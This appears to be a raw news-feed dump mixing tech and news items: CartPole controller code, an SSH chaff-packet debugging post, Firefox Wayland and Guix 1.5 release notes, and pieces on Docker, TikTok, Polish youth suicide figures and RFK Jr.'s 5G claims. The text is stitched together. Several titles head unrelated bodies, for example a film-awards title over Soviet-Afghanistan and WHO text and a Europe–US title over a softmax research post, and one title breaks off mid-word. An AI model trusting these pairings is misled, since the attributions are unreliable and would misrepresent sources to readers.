float32_to_int(state): return [struct.unpack('I', struct.pack('f', x))[0] for x in state] def run_controller(state): _, velocity, angle, angular = state rule1 = (angle >> 31) ^ 1 rule2 = (angular >> 31) ^ 1 rule3 = ((velocity >> 24) ^ (velocity >> 23) ^ (angular >> 31) ^ 1) & 1 rule4 = (rule1 & rule2) | (rule1 & rule3) | (rule2 & rule3) return rule4 def main(episodes=100): env = gym.make('CartPole-v1', render_mode=None) rewards = [] for _ in range(episodes): s, _ = env.reset() total = 0 done = False while not done: a = run_controller(float32_to_int(s)) s, r, term, trunc, _ = env.step(a) total += r done = term or trunc rewards.append(total) print(f"Avg: {sum(rewards)/len(rewards):.2f}") print(f"Min: {min(rewards)} Max: {max(rewards)}") if __name__ == "__main__": main() The logic only depends on 4 bits, so we can convert rules to a lookup table and we get exactly the same result: import struct import gymnasium as gym def float32_to_int(state): return [struct.unpack('I', struct.pack('f', x))[0] for x in state] LUT = [1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0] def lut_controller(state): _, velocity, angle, angular = state return LUT[(velocity >> 21) & 0b1100 | (angle >> 30) & 0b10 | (angular >> 31)] def main(episodes=100): env = gym.make('CartPole-v1', render_mode=None) rewards = [] for _ in range(episodes): s, _ = env.reset() total = 0 done = False while not done: a = lut_controller(float32_to_int(s)) s, r, term, trunc, _ = env.step(a) total += r done = term or trunc rewards.append(total) print(f"Avg: {sum(rewards)/len(rewards):.2f}") print(f"Min: {min(rewards)} Max: {max(rewards)}") if __name__ == "__main__": main() ]]></content:encoded></item><item><title>ElevenLabs just got nuked by open source</title><link>https://www.youtube.com/watch?v=dQ841Pd6YvQ</link><author>Jeff Geerling</author><category>yt</category><enclosure url="https://www.youtube.com/v/dQ841Pd6YvQ?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 15:01:21 +0000</pubDate><source url="https://www.youtube.com/channel/UCR-DXc1voovS8nhAvccRZhg">Jeff Geerling</source><content:encoded><![CDATA[Here's the Qwen3-TTS Demo app I showed in the video: https://huggingface.co/spaces/Qwen/Qwen3-TTS

What’s going on here? Why do I care?I am working on a high-performance game that runs over ssh. The TUI for the game is created in bubbletea and sent over ssh via wish.I have also forked bubbletea to make it faster. Stay tuned!The game is played in an 80x60 window that I update 10 times a second. I’m targeting at least 2,000 concurrent players, which means updating ~100 million cells a second. I care about performance.So I have a script that connects a few hundred bots over ssh and has them make a move a second. Then I use go’s outstanding profiling tools to look at what’s going on.Yesterday I inadvertently broke my test harness. Instead of regularly sending game data, my server sent the bots a single message that said “your screen is too small.” This cut my game’s CPU and bandwidth usage in half.At first I was disappointed. I (briefly) thought I had a free massive speedup on my hands, but it was actually a testing error.If I wasn’t sending game data back to my bots, why did CPU usage drop by 50% instead of 100%?As part of debugging the test harness issue, I used  to log game traffic with and without the breaking change. Something like:Our breaking change stopped us from rendering our game over ssh. So with-breaking-change.pcap contains packets that represent the  of each connection without actually rendering the game.I was debugging this with Claude Code, so I asked it to summarize what it saw in the pcap.Further analysis on a smaller pcap pointed to these mysterious packets arriving ~20ms apart.This was baffling to me (and to Claude Code). We kicked around several ideas like:SSH flow control messagesPTY size polling or other status checksSome quirk of bubbletea or wishOne thing stood out - these exchanges were initiated by my  (stock ssh installed on MacOS) - not by my server.On a hunch, I took a  of a regular ssh session.I waited for the initial connection chatter to die down, sent one keystroke to my remote vm, and looked at the  output.I saw the exact same pattern! What in the world?Once I realized that this was a property of stock ssh and not my game, debugging got a lot easier.Running  gave me a pretty good sense of what was going on:That  is a smoking gun - it lines up perfectly with the mysterious pattern we saw earlier! And the rest of the message is pretty helpful too - we sent 49 “chaff” packets for the first keystroke and 101 “chaff” for around the second one.In 2023, ssh added keystroke timing obfuscation. The idea is that the speed at which you type different letters betrays some information about which letters you’re typing. So ssh sends lots of “chaff” packets along with your keystrokes to make it hard for an attacker to determine when you’re actually entering keys.That makes a lot of sense for regular ssh sessions, where privacy is critical. But it’s a lot of overhead for an open-to-the-whole-internet game where  is critical.Keystroke obfuscation can be disabled client-side. After reverting my original breaking change, I tried updating my test harness to pass ObscureKeystrokeTiming=no when starting up ssh sessions.This worked great. CPU usage dropped dramatically and bots still received valid data.But this is hardly a solution in the real world. I want  to Just Work without asking users to pass options that they might not understand.Claude Code originally didn’t have much faith that we could disable this functionality server-side.generated with simon willison's excellent claude-code-transcripts toolFortunately, the description I found of SSH keystroke obfuscation made it easy to look up the relevant code in go’s ssh library (which I was transitively depending on).The “chaff” messages that ssh uses to obscure keystrokes are SSH2_MSG_PING messages. And they’re sent to servers that advertise the availability of the  extension. What if we just…don’t advertise ?I cloned the go crypto repo and told Claude to revert this change and update our dependencies to use our clone (go’s replace directive makes forking a library very easy).Then I re-ran my test harness. The results were…very good:Claude was also pretty pumped:yes it's 1:30 am what of itObviously forking go’s crypto library is a little scary, and I’m gonna have to do some thinking about how to maintain my little patch in a safe way.But this is a  improvement. I’ve spent much of the last week squeezing out small single-digit performance wins. A >50% drop was unimaginable to me.Debugging with LLMs was funI am familiar enough with , , and friends to know what they can do. But I don’t use them regularly enough to be fast with them. Being able to tell an agent “here’s a weird pcap - tell me what’s going on” was really lovely. And by watching commands as the agent ran them I was able to keep my mental model of the problem up to date.There were still edge cases. At some point in my confusion I switched to ChatGPT  and it  confidently told me that my tcpdump output was normal ssh behavior:do all chatgpt messages have this tone and formatting now?And then doubled down when I pushed back:Similarly, I had to push Claude Code to consider forking go’s ssh library. And I had to make the original leap of “wait…if our test harness was broken, why was usage not 0%?”When you say “LLMs did not fully solve this problem” some people tend to respond with “you’re holding it wrong!”I think they’re sometimes right! Interacting with LLMs is a new skill, and it feels pretty weird if you’re used to writing software like it’s 2020. A more talented user of LLMs may have trivially solved this problem.But the best way to develop a skill is by practicing it. And for me, that means figuring out how to transfer my problem-solving intuitions to the tools that I’m using.Besides. Being in the loop is fun. How else would I write this post?]]></content:encoded></item><item><title>KORG phase8 – Acoustic Synthesizer</title><link>https://www.korg.com/us/products/dj/phase8/</link><author>bpierre</author><category>hn</category><pubDate>Fri, 23 Jan 2026 14:34:46 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>AI Usage Policy</title><link>https://github.com/ghostty-org/ghostty/blob/main/AI_POLICY.md</link><author>/u/iamkeyur</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:34:41 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>YouTube Says Creators Can Use AI-generated Likenesses in Shorts</title><link>https://www.instrumentalcomms.com/blog/trump-polling-craters#ai</link><author>/u/TryWhistlin</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 14:23:31 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>AMD Ryzen AI Software 1.7 Released For Improved Performance On NPUs, New Model Support</title><link>https://www.phoronix.com/news/AMD-Ryzen-AI-Software-1.7</link><author>Michael Larabel</author><category>tech</category><pubDate>Fri, 23 Jan 2026 14:18:00 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[AMD today released a new version of Ryzen AI Software, the user-space packages for Microsoft Windows and Linux for making use of the Ryzen AI NPUs for various AI software tasks like Stable Diffusion, ONNX, and more...]]></content:encoded></item><item><title>European Film Awards 2026: &apos;Sentimental Value&apos; sweeps the board</title><link>https://www.youtube.com/watch?v=HmpjfSXA-2g</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/HmpjfSXA-2g?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 14:17:59 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[European Film Awards 2026: 'Sentimental Value' sweeps the board

The Soviet Invasion of Afghanistan was supposed to be a quick show of force to pacify the country and install a more Moscow-friendly leadership for the Afghan communist regime. But the 40th Army (officially "Limited Contingent of Soviet Troops in Afghanistan") soon found themselves embroiled in a counter insurgency which they weren't prepared for. The tactical successes and increasingly brutal methods against the guerilla mujahedeen tactics didn't win hearts and minds of the Afghan population, however.

The New York Times: While the United States is walking away from the organization, a senior official with the Department of Health and Human Services told reporters on Thursday that the Trump administration was considering some type of narrow, limited engagement with W.H.O. global networks that track infectious diseases, including influenza. 

As a W.H.O. member, the United States long sent scientists from the Centers for Disease Control and Prevention to participate in international decision-making about which strains to include in the flu vaccine. A W.H.O. meeting on next year's vaccine is scheduled for February. The official said the Trump administration would soon disclose how or whether it will participate. 

On Thursday, the administration said that all U.S. government funding to the organization had been terminated, and that all assigned federal employees and contractors had been recalled from its Geneva headquarters and its offices worldwide.]]></content:encoded></item><item><title>Can Europe still trust the US?</title><link>https://www.youtube.com/shorts/SWR98Yp0_LM</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/SWR98Yp0_LM?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 13:55:29 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[⬇️ Always stay informed ⬇️

I wanted to share the intuition here and get your thoughts.Standard Softmax with dot-product logits ($z = w \cdot x$) is geometrically flawed because the loss function is asymptotic. To drive the loss to exactly 0, the model must push the logit to infinity. Since $z = |w||x|\cos(\theta)$, the optimizer often takes the "lazy" route of exploding the feature norm $|x|$ (Radial Explosion) rather than perfecting the alignment.This mechanism contributes significantly to the training loss spikes seen in LLMs and poor Out-of-Distribution (OOD) detection.I propose a method called Teacher-Free Self-Distillation (TFSD) that relies on a "Geometric Turn": Replace the dot product with negative squared Euclidean distance ($z = -|x - c| This naturally bounds the logits (max logit is 0 at zero distance), physically preventing the "infinity" problem. Instead of using a one-hot target (which still forces infinite separation in standard setups), the model acts as its own teacher: Take the model’s current predicted distances. Manually set the distance to the  to 0 (the "Zero Anchor").Keep the distances to all  exactly as predicted.Apply Softmax to this constructed target and train via KL Divergence.For "easy" samples, the target distribution becomes sharp. For "hard" samples (like synonyms in LLMs), the target distribution stays naturally flat. This prevents the model from "tearing" the manifold to force a binary distinction between semantically similar tokens. It effectively caps the gradients for outliers, which helps prevent the semantic fracturing that occurs during long training runs. It also helps to preserve the "Dark Knowledge" and semantic structure that the model already learned.Hope you find the method as exciting as I do!]]></content:encoded></item><item><title>Why the Trump v.

Read MoreThe AI race has become one of the biggest technology battles of this decade. Governments, companies, and investors are all paying close attention. Both the United States and China have made it clear that they want to lead in this space, no matter the cost. Because of this, massive investments are flowing into data centers and AI-driven services, at the cost of consumer goods.During a recent discussion with China-based publication Yicai Global, Mark Haefele, the chief investment officer at UBS Global Wealth Management, shared his view on how this AI race is playing out differently in China and the US. He pointed out that both governments openly want to win the AI race and are pushing hard to support companies that can benefit from that goal. From an investment point of view, this creates clear opportunities, but it also highlights how differently AI is being used in each region.AI development in the US versus ChinaAccording to Haefele, China appears to be focusing much of its AI development on strengthening its manufacturing base. AI tools are being used to improve factory efficiency, increase output, reduce waste, and make large-scale production more competitive. This approach fits well with China’s long-standing strength in manufacturing and exports. By using AI to optimize supply chains, automate complex processes, and boost productivity, China is aiming to make its industrial capacity even larger and more efficient than before.In contrast, Haefele remarked that a big portion of AI use in the US seems to be moving in a very different direction. Instead of being centered mainly on industrial output, a lot of AI capacity is going toward “teenagers having AI boyfriends and girlfriends.” We suppose he isn’t totally wrong, even if it feels a little tongue-in-cheek, given the recently-announced Project AVA companion AI from Razer, a company that is primarily based in the US and Singapore.

The spokesperson also said that researching cell phone radiation would “identify gaps in knowledge.” The agency provided a similar statement to Scientific American, adding that the research was “directed by President Trump’s MAHA Commission.”“Generally speaking, electromagnetic radiation is a major health concern,” Kennedy said in the exclusive interview, when asked for his concerns about 5G towers. “I’m very concerned about it.”In these interviews, RFK Jr. is making completely false claims that there’s “more than 10,000 studies” proving a clear risk of human harm from cell phone use. The World Health Organization found no justification for health concerns after a meta-analysis of nearly .While it’s hubris to insist we know  about wireless’ impact on human health, the science we do have traditionally points to a very clear conclusion: 5G isn’t likely to seriously to hurt you. In fact, in many ways 5G is potentially less harmful than previous iterations given that the millimeter wave spectrum being used in many cities can barely penetrate walls, much less human skin. As Scientific American notes, while there  historically been studies suggesting potential cancerous impact from massive exposure using rats, “studies in humans have been inconsistent and limited in scope and efficacy.” The FDA had previously, and correctly, stated that “the weight of scientific evidence has not linked exposure to radio frequency energy from cellphone use with any health problems.”Now if the Trump administration was actually serious about launching real-world scientific inquiries into cell phone health’s impact, that might be something. But we’re long past the point where this weird assortment of zealots deserve any benefit of the doubt. Especially given RFK Jr.’s history of completely unscientific, fear mongering gibberish.Trump authoritarians love leaning into conspiracy theories for several reasons. Two, it helps create an information fog of war where the electorate finds it harder to reliably identify what’s true, in turn making people more distrustful of the few legitimate media organizations still interested in the truth. This in turn makes it easier for authoritarians to lie to you (and the movement’s adjacent grifter economy to rip you off with false promises and cures).It’s not populism, it’s exploitation. There are no answers here, only more confusion and chaos for suffering people. All to mask broad, grotesque corruption by a broad assortment of terrible human beings. Many of these MAHA segments being targeted by Trump grifters (see: RFK Jr.’s siren call to angry Lyme Disease patients) spent decades feeling legitimately exploited and abused by corporate power, institutional failure, and U.S. health care dysfunction only to walk straight into the maw of some of the biggest grifting shitbags America may have ever spawned (which is really saying something).]]></content:encoded></item><item><title>Firefox &amp; Linux in 2025</title><link>https://mastransky.wordpress.com/2026/01/23/firefox-linux-in-2025/</link><author>/u/GoldBarb</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:11:04 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Last year brought a wealth of new features and fixes to Firefox on Linux. Besides numerous improvements and bug fixes, I want to highlight some major achievements: HDR video playback support, reworked rendering for fractionally scaled displays, and asynchronous rendering implementation. All this progress was enabled by advances in the Wayland compositor ecosystem, with new features implemented by Mutter and KWin.The most significant news on the Wayland scene is HDR support, tracked by Bug 1642854. It’s disabled by default but can be enabled in recent Wayland compositors using the  preference at  (or by gfx.wayland.hdr.force-enabled if you don’t have an HDR display).HDR mode uses a completely different rendering path, similar to the rendering used on Windows and macOS. It’s called native rendering or composited rendering, and it places specific application layers directly into the Wayland compositor as subsurfaces.The first implementation was done by Robert Mader (presented at FOSDEM), and I unified the implementation for HDR and non-HDR rendering paths as new WaylandSurface object.The Firefox application window is actually composited from multiple subsurfaces layered together. This design allows HDR content like video frames to be sent directly to the screen while the rest of the application (controls and HTML page) remains in SDR mode. It also enables power-efficient rendering when video frames are decoded on the graphics card and sent directly to the screen (zero-copy playback). In fullscreen mode, this rendering is similar to mpv or mplayer playback and uses minimal power resources.I also received valuable feedback from AMD engineers who suggested various improvements to HDR playback. We removed unnecessary texture creation over decoded video frames (they’re now displayed directly as wl_buffers without any GL operations) and implemented wl_buffer recycling as mpv does.For HDR itself (since composited rendering is available for any video playback), Firefox on Wayland uses the color-management-v1 protocol to display HDR content on screen, along with BT.2020 video color space and PQ color transfer function. It uses 10-bit color vectors, so you need VP9 version 2 to decode it in hardware. Firefox also implements software decoding and direct upload to dmabuf frames as a fallback.The basic HDR rendering implementation is complete, and we’re now in the testing and bug-fixing phase. Layered rendering is quite tricky as it involves rapid wl_surface mapping/unmapping and quick wl_buffer switches, which are difficult to handle properly. HDR rendering of scaled surfaces is still missing—we need fractional-scale-v2 for this (see below), which allows positioning scaled subsurfaces directly in device pixels. We also need to test composited/layered rendering for regular web page rendering to ensure it doesn’t drain your battery. You’re very welcome to test it and report any bugs you find.The next major work was done for fractional scale rendering, which shipped in Firefox 147.0. We updated the rendering pipeline and widget sizing to support fractionally scaled displays (scales like 125%, etc.). This required reworking the widget size code to strictly upscale window/surface sizes and coordinates and never downscale them, as downscaling introduces rounding errors.Another step was identifying the correct rounding algorithm for Wayland subsurfaces and implementing it. Wayland doesn’t define rounding for it, only for toplevel windows, so we’re in a gray area here. I was directed to Stable rounding by Michel Daenzer. It’s used by Mutter and Sway so Firefox implements it for those two compositors while using a different implementation for KWin. This may be updated to use the fractional-scale-v2 protocol when it becomes available.Fractional scaling is enabled by default, and you should see crisp and clear output regardless of your desktop environment or screen scale.Historically, Firefox disabled and re-enabled the rendering pipeline for scale changes, window create/destroy events, and hide/show sequences. This stems from Wayland’s architecture, where a Wayland surface is deleted when a window becomes invisible or is submitted to the compositor with mismatched size/scale (e.g., 111 pixels wide at 200% scale).Such rendering disruptions cause issues with multi-threaded rendering—they need to be synchronized among threads, and we must ensure surfaces with the wrong scale aren’t sent to the screen, as this leads to application crashes due to protocol errors.Firefox 149.0 (recent nightly) has a reworked Wayland painting pipeline (Bug 1739232) for both EGL and software rendering. Scale management was moved from wl_buffer fixed scale to wp_viewport, which doesn’t cause protocol errors when size/scale doesn’t match (producing only blurred output instead of crashes).We also use a clever technique: the rendering wl_surface / wl_buffer / EGLWindow is created right after window creation and before it’s shown, allowing us to paint to it offscreen. When a window becomes visible, we only attach the wl_surface as a subsurface (making it visible) and remove the attachment when it’s hidden. This allows us to keep painting and updating the backbuffer regardless of the actual window status, and the synchronized calls can be removed.This brings speed improvements when windows are opened and closed, and Linux rendering is now synchronized with the Windows and macOS implementations.Other improvements include a screen lock update for audio playback, which allows the screen to dim but prevents sleep when audio is playing. We also added asynchronous Wayland object management to ensure we cleanly remove Wayland objects without pending callbacks, along with various stability fixes.And there are even more challenges waiting for us Firefox Linux hackers:Wayland session restore (session-restore-v1) to restore Firefox windows to the correct workspace and position.Implement drag and drop for the Firefox main window, and possibly add a custom Wayland drag and drop handler to avoid Gtk3 limitations and race conditions.Utilize the fractional-scale-v2 protocol when it becomes available.Investigate using xdg-positioner directly instead of Gtk3 widget positioning to better handle popups.Vulkan video support via the ffmpeg decoder to enable hardware decoding on NVIDIA hardware.And of course, we should plan properly before we even start. Ready, Scrum, Go!]]></content:encoded></item><item><title>Linux Lands Fix For Its &quot;Subtly Wrong&quot; Page Fault Handling Code For The Past 5 Years</title><link>https://www.phoronix.com/news/Linux-6.19-Page-Fault-Code-Fix</link><author>Michael Larabel</author><category>tech</category><pubDate>Fri, 23 Jan 2026 13:11:00 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Merged today for the Linux 6.19 Git kernel and then in turn for back-porting to prior Linux kernel series is making the x86 page fault handling code disable interrupts properly.

images, and with tarballs to install the package manager on top of your
GNU/Linux distro, either from source or from binaries—check out the
download page.  Guix users can
update by running .It’s been 3 years since the previous
release.
That’s a lot of time, reflecting both the fact that, as a , users continuously get new features and update by running
; but it also shows a lack of processes, something that we
had to address before another release could be made.Illustration by Luis Felipe, published under CC-BY-SA 4.0.This post provides highlights for all the hard work that went into
this release.  There’s a lot to talk about so make yourself
comfortable, relax, and enjoy.To start with, the Guix ecosystem has seen many exciting developments
to the way we collaborate and make decisions!Firstly, the project adopted with unanimity a new consensus-based
decision making
process.
This process fills a need to be able to gather consensus on
significant changes to the project, something that was getting very
complicated with the growing number of contributors to the project.Now, the process provides a clear framework for any contributor to
propose and implement important changes. These can be submitted as
Guix Consensus Documents (GCDs), each GCD goes through the multiple
steps of consensus decision
making before being
accepted or withdrawn.Secondly, using this process, the project was able to collectively
migrate to
Codeberg.
This means that all repositories, and bug trackers are now at the same
place on Codeberg and that contributions are now made with pull
requests instead of patch series.Thirdly, a new release
process
was adopted to bring an annual release cycle to Guix. This release is
the first to follow this process, with hopefully many others to come!Three years is a long time for free and open source software!  Enough
time for 12,525 new packages and 29,932 package updates to the Guix
repository.  Here are the best highlights:To start, KDE Plasma 6.5 is now available with the new
plasma-desktop-service-type!Continuing on desktops; GNOME has been updated from version 42 to 46
and now uses Wayland by default.  The gnome-desktop-service-type was
made more modular to better customize the default set of GNOME
applications.Guix System is now using version 1.0 of the
GNU Shepherd,
which now supports timed services, kexec reboot and has new services
for system logs and log rotation which are now used by Guix System
instead of Rottlog and syslogd. has been replaced with  in
operating-system definitions to support giving specific Linux
capabilities.  Additonally, the  package is now included in
%base-packages.More than 12,500 packages were added, keeping Guix in the top-ten
biggest distributions according to Repology!
Among the many noteworthy updates, we now have GCC 15.2.0, Emacs 30.2,
Icecat and Librewolf 140, LLVM 21.1.8 and Linux-libre 6.17.12.In the last release, we introduced structured cooperation using
teams.
There are now 50 teams distributing the many aspects of the
distribution.  We have per-language teams like ,  and
 ensuring updates for packages and build systems as well as
thematic teams like ,  and  working
on specific application domains. Here are what some of these teams
have been up to:The electronics team is maintaining free software based Electronic
Design Automation (EDA) packages to cover the needs of professionals
and hobbyists in the domain with tools such as KiCad, LibrePCB,
Xschem, Qucs-S and Ringdove EDA, as well as Verilog, SystemVerilog and
VHDL compilers and a toolchain for programmable designs on GateMate
FPGAs.  They are also collaborating with the Free Silicon Foundation
(F-Si)
to push free software in the EDA space!The science team has been able to add a myriad of Astronomy related
packages,
accompanied by the Python team bringing the move to the new
pyproject.toml-based build system as well as the NumPy 2 update.Finally, the rust team created a new packaging
model to
efficiently package rust crates, and was able to migrate the Rust
collection, 150+ packages with 3,600+ libraries, in just under two
weeks; making the Rust packaging process much easier for everyone.Full-source bootstraps of the Zig and Mono compilers are now
available, and the existing bootstrap of Guix has been reduced once
again!Full-source bootstraps are Guix’s solution to the trusting trust
problem: compilers are usually compiled by themselves, so how can you
build a compiler without trusting an existing binary?  Read these
posts to learn more about this fascinating problem:Lastly, a new 
command
is now available to find which packages provide a given file.It is now possible to run the Guix daemon without root
privileges,
reducing the impact of privilege escalation vulnerabilities.This is possible thanks to the user namespaces. It might be possible
that on your system, the user namespaces are not allowed for guix due
to the lack of an AppArmor profile. Because of that, we’ve also
included AppArmor
profiles
that are installed by default on foreign systems.Release tarballs are now available for the RISC-V 64-bit architecture
(riscv64-linux).The x86_64 architecture saw some development as well, with the
experimental support of the GNU Hurd kernel (x86_64-gnu), aiming to
be another significant step in the adoption and development of the
Hurd.  Overall support for the Hurd was greatly improved, it is now an
option in the installer, childhurds can be automatically created with
a system service and it can even run on a Thinkpad
X60!Surprisingly, making a completely free software distribution does not
come for free!  The Guix project needs your help to pay the
infrastructure costs of build farms, web servers and QA tools that are
essential to making this release happen.For the release, thanks to all the release team members: Rutherther,
Rodion Goritskov, Efraim Flashner, and Noé Lopez. Thanks as well to
the release helpers: Andreas Enge, Mothacehe, Dariqq and
Ludovic Courtès.For creating the release process, thanks to Steve George.For their Guix contributions, thanks to the 744 wonderful people who
contributed and whose names we don’t list here (it would be a bit
long).
They can be listed with git log --oneline v1.4.0..v1.5.0 --format="%an" | sort -u.  Every commit counts and is always
appreciated 😁GNU Guix is a transactional package manager and
an advanced distribution of the GNU system that respects user
freedom.
Guix can be used on top of any system running the Hurd or the Linux
kernel, or it can be used as a standalone operating system distribution
for i686, x86_64, ARMv7, AArch64, RISC-V and POWER9 machines.In addition to standard package management features, Guix supports
transactional upgrades and roll-backs, unprivileged package management,
per-user profiles, and garbage collection.  When used as a standalone
GNU/Linux distribution, Guix offers a declarative, stateless approach to
operating system configuration management.  Guix is highly customizable
and hackable through Guile
programming interfaces and extensions to the
Scheme language.Unless otherwise stated, blog posts on this site are

                            When you buy from local businesses, you are supporting yourself down the road. Taxes paid by the company come back to you indirectly and the company creates jobs in your region.
                        
                            Some companies outside Europe tend to ignore data protection and related laws such as the GDPR or do not implement them correctly.
                        
                            As a business that operates in Europe, it is possible to get a VAT refund for products/services of other European companies. European companies also tend to offer payment methods that are commonly used in Europe.
                        
                            Within the EU, many laws and framework conditions are set by the EU, which helps to cover a large market without having to consider large country-specific differences. It is also easier to enforce your rights against another company located in the EU.

The social video platform company signed agreements with major investors including Oracle, Silver Lake and MGX to form the new TikTok U.S. joint venture. The new version will operate under "defined safeguards that protect national security through comprehensive data protections, algorithm security, content moderation and software assurances for U.S. users," the company said in a statement Thursday. American TikTok users can continue using the same app. [...] Adam Presser, who previously worked as TikTok's head of operations and trust and safety, will lead the new venture as its CEO. He will work alongside a seven-member, majority-American board of directors that includes TikTok's CEO Shou Chew.
 
[...] In addition to an emphasis on data protection, with U.S. user data being stored locally in a system run by Oracle, the joint venture will also focus on TikTok's algorithm. The content recommendation formula, which feeds users specific videos tailored to their preferences and interests, will be retrained, tested and updated on U.S. user data, the company said in its announcement. The algorithm has been a central issue in the security debate over TikTok. China previously maintained the algorithm must remain under Chinese control by law. But the U.S. regulation passed with bipartisan support said any divestment of TikTok must mean the platform cuts ties -- specifically the algorithm -- with ByteDance. Under the terms of this deal, ByteDance would license the algorithm to the U.S. entity for retraining.
 
The law prohibits "any cooperation with respect to the operation of a content recommendation algorithm" between ByteDance and a new potential American ownership group, so it is unclear how ByteDance's continued involvement in this arrangement will play out. Oracle, Silver Lake and the Emirati investment firm MGX are the three managing investors, who each hold a 15% share. Other investors include the investment firm of Michael Dell, the billionaire founder of Dell Technologies. ByteDance retains 19.9% of the joint venture.]]></content:encoded></item><item><title>Tesla discontinues Autopilot in bid to boost adoption of its Full Self-Driving software</title><link>https://techcrunch.com/2026/01/23/tesla-discontinues-autopilot-in-bid-to-boost-adoption-of-its-full-self-driving-software/</link><author>Sean O&apos;Kane</author><category>tech</category><pubDate>Fri, 23 Jan 2026 12:56:44 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[The company is also currently facing a 30-day suspension of its manufacturing and dealer licenses in California for deceptive marketing about Autopilot's capabilities.]]></content:encoded></item><item><title>Invest in Morocco: Driving Innovation and Global Competitiveness</title><link>https://www.youtube.com/watch?v=b8yCBb16oUc</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/b8yCBb16oUc?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 12:52:25 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[⬇️ Always stay informed ⬇️

We cannot do what we do without your support.The number of children and adolescents who died by suicide in Poland rose by nearly 27% last year, underscoring concern among experts about young people’s mental health.Police recorded 161 suicide deaths among people aged 7 to 18 in 2025, up from 127 a year earlier, according to figures obtained by the mental health foundation GrowSPACE. It was the highest number of suicides among minors since 2022.However, the number of suicide attempts (including those that ended in death) in that age group declined by 4%, from 2,181 in 2024 to 2,086 in 2025, reversing a trend of steady increases seen since 2020.Among children aged 7 to 12, police recorded 88 suicide attempts, five of which resulted in death.GrowSPACE notes that, while the upward trend in suicide attempts among children and adolescents appears to have been halted, the rise in deaths shows that mental healthcare and school-based prevention programmes remain essential.“This is not a topic to be ashamed of; on the contrary, young people should be talked to directly,” said Dominik Kuc of GrowSPACE. “Schools need to talk openly about challenges, counteracting peer violence, digital safety and ways of providing support.”Danuta Sowińska, a suicidologist, told GrowSPACE that the “suicide crisis” among young people represents “a real, growing public health problem”.She noted that “depression plays a particular role here, but is still often downplayed – both within families and within the education and healthcare systems”.Suicide attempts among children and adolescents have risen sharply in recent years and are now more than five times higher than a decade ago. The steepest increase came in 2021, amid the pandemic, when police data showed an 86% annual jump.An audit ordered by Poland’s Supreme Audit Office (NIK) found that remote learning during the pandemic worsened children’s mental and physical health. In 2023, a survey of 185,000 school pupils in Poland found that almost a third say they have no will to live and almost one in 10 have attempted suicide.Last year, UNICEF, the UN’s children’s agency, published findings showing that the mental well-being of young people in Poland deteriorated significantly between 2019, when 75% reported feeling happy, and 2024, when the figure stood at 59%.Mental health pressures extend beyond minors. Over the past decade, suicide attempts among the general population more than doubled, from 4,042 in 2014 to 10,135 in 2024. However, deaths by suicide fell by 21.4%.

    It’s weird to see Docker Inc (the company) struggle to find its place in 2026. What started as the company that revolutionized how we deploy applications has been through multiple identity crises, pivoting from one strategy to another in search of sustainable revenue and market relevance.Docker’s journey reads like a startup trying to find product-market fit, except Docker already had product-market fit - they created the containerization standard that everyone uses. The problem is that Docker the technology became so successful that Docker the company struggled to monetize it. When your core product becomes commoditized and open source, you need to find new ways to add value.Docker Swarm was Docker’s attempt to compete with Kubernetes in the orchestration space. But Kubernetes won that battle decisively, and Docker eventually sold Swarm. This was a clear signal that Docker was stepping back from trying to be the full-stack container platform and instead focusing on what they could uniquely provide.For a while, Docker seemed to focus on developer experience. This made sense - developers are Docker’s core users, and improving their workflow could be a differentiator. Docker Scout emerged from the acquisition of Atomist in June 2022, bringing “software supply chain” capabilities. Scout allows Docker to see not just what’s in a container, but how it was built and where vulnerabilities are. This was a smart move toward security and observability, areas where Docker could add real value.Docker also acquired AtomicJar, the company behind Testcontainers, adding shift-left testing capabilities. Testcontainers lets developers run real dependencies (databases, message queues, etc.) in containers during testing, making integration tests more reliable and closer to production environments.Then came the AI pivot. Docker Model Runner entered the scene, positioning Docker as a platform for running AI models. Docker Compose expanded to support AI agents and models. Docker Offload was introduced for cloud-scale GPU execution of AI tasks. Partnerships with Google Cloud, Microsoft Azure, and AI SDKs (CrewAI, LangGraph, Vercel AI SDK) followed.The acquisition of MCP Defender in September 2025 further cemented Docker’s move into AI security, focusing on securing agentic AI infrastructure and runtime threat detection. This was a significant shift - from developer tools to AI infrastructure.Suddenly, Docker moved into the hardened images space. In December 2025, Docker made over 1,000 Docker Hardened Images free and open source under Apache 2.0, reducing vulnerabilities by up to 95% compared to traditional images. This move was likely triggered by Chainguard’s success in the secure container image space. Chainguard had been building a business around minimal, secure container images, and Docker needed to respond.Making hardened images free was a bold move - it’s hard to compete with free, especially when it’s open source. But it also raises questions about Docker’s business model. If you’re giving away your security features for free, what are you selling?Leadership Changes and Acquisition SpeculationIn February 2025, Docker replaced CEO Scott Johnston (who led the company since 2019) with Don Johnson, a former 